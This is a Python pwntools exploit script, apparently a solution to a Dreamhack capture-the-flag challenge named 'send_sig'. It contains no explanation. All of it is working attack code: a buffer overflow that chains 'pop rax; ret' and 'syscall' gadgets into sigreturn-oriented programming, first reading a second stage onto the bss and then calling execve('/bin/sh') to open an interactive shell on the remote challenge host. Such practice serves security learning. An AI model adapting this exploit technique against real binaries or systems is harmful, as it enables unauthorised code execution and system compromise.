#!/usr/bin/env python3

from pwn import *

exe = ELF("./send_sig")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 14020)

    return r


def main():
    r = conn()
    
    gadget = next(exe.search(asm("pop rax; ret")))
    syscall = next(exe.search(asm("syscall; ret")))
    fake_stack = exe.bss() + 0x18
    
    frame = SigreturnFrame()
    frame.rax = 0                               # SYS_read
    frame.rdi = 0                               # stdin
    frame.rsi = fake_stack
    frame.rdx = 0x1000
    frame.rsp = fake_stack + 8
    frame.rip = syscall

    payload = b"A" * 0x10
    payload += p64(gadget)
    payload += p64(15)                          # SYS_rt_sigreturn
    payload += p64(syscall)
    payload += bytes(frame)

    r.send(payload)

    frame2 = SigreturnFrame()
    frame2.rax = 59                             # SYS_execve
    frame2.rdi = fake_stack
    frame2.rsi = 0
    frame2.rdx = 0
    frame2.rsp = fake_stack + 0x500
    frame2.rip = syscall

    payload2 = b"/bin/sh\x00"
    payload2 += p64(gadget)
    payload2 += p64(15)                         # SYS_rt_sigreturn
    payload2 += p64(syscall)
    payload2 += bytes(frame2)

    sleep(0.5)
    r.send(payload2)

    r.interactive()

if __name__ == "__main__":
    main()